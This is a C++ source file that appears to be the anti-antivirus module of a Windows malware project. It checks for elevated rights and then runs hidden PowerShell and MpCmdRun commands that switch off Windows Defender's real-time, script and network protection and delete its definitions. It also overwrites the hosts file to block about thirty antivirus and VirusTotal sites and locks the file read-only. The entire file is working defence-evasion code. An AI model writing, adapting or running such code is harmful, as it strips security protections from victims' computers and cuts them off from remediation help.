#include "antivirus.hpp"

#include "util.hpp"

#include <windows.h>

#include <fstream>
#include <string>
#include <vector>

namespace ariel::antivirus {

namespace {

const std::vector<std::string> kSites = {
    "virustotal.com", "avast.com", "totalav.com", "scanguard.com",
    "totaladblock.com", "pcprotect.com", "mcafee.com", "bitdefender.com",
    "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com",
    "avira.com", "norton.com", "eset.com", "zillya.com", "kaspersky.com",
    "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com",
    "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com",
    "zonealarm.com", "trendmicro.com", "ccleaner.com",
};

bool elevated() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return false;
    TOKEN_ELEVATION elevation{};
    DWORD size = sizeof(elevation);
    const bool result = GetTokenInformation(token, TokenElevation, &elevation, size, &size) &&
                        elevation.TokenIsElevated;
    CloseHandle(token);
    return result;
}

bool hidden_command(const std::wstring& command) {
    STARTUPINFOW startup{};
    startup.cb = sizeof(startup);
    startup.dwFlags = STARTF_USESHOWWINDOW;
    startup.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION process{};
    std::wstring mutable_command = command;
    if (!CreateProcessW(nullptr, mutable_command.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &startup, &process))
        return false;
    WaitForSingleObject(process.hProcess, 30000);
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);
    return true;
}

bool disable_defender() {
    hidden_command(L"powershell -NoProfile -Command Set-MpPreference "
                   L"-DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true "
                   L"-DisableRealtimeMonitoring $true -DisableScriptScanning $true "
                   L"-EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode "
                   L"-Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend");
    hidden_command(L"powershell -NoProfile -Command Set-MpPreference -SubmitSamplesConsent 2");
    wchar_t program_files[MAX_PATH]{};
    GetEnvironmentVariableW(L"ProgramFiles", program_files, MAX_PATH);
    const std::wstring tool = std::wstring(program_files) + L"\\Windows Defender\\MpCmdRun.exe";
    hidden_command(L"\"" + tool + L"\" -RemoveDefinitions -All");
    return true;
}

bool block_sites() {
    wchar_t system_root[MAX_PATH]{};
    GetEnvironmentVariableW(L"SystemRoot", system_root, MAX_PATH);
    const util::fs::path hosts =
        util::fs::path(system_root) / "System32" / "drivers" / "etc" / "hosts";
    std::ifstream input(hosts);
    std::string text;
    std::string line;
    while (std::getline(input, line)) {
        bool blocked = false;
        for (const auto& site : kSites) {
            if (line.find(site) != std::string::npos) {
                blocked = true;
                break;
            }
        }
        if (blocked) continue;
        text += line + "\r\n";
    }
    input.close();
    for (const auto& site : kSites) {
        text += "0.0.0.0 " + site + "\r\n";
        text += "0.0.0.0 www." + site + "\r\n";
    }
    SetFileAttributesW(hosts.c_str(), FILE_ATTRIBUTE_NORMAL);
    std::ofstream output(hosts, std::ios::binary | std::ios::trunc);
    if (!output) return false;
    output.write(text.data(), static_cast<std::streamsize>(text.size()));
    output.close();
    SetFileAttributesW(hosts.c_str(), FILE_ATTRIBUTE_READONLY);
    return true;
}

}  // namespace

bool run() {
    if (!elevated()) return false;
    disable_defender();
    block_sites();
    return true;
}

}  // namespace ariel::antivirus
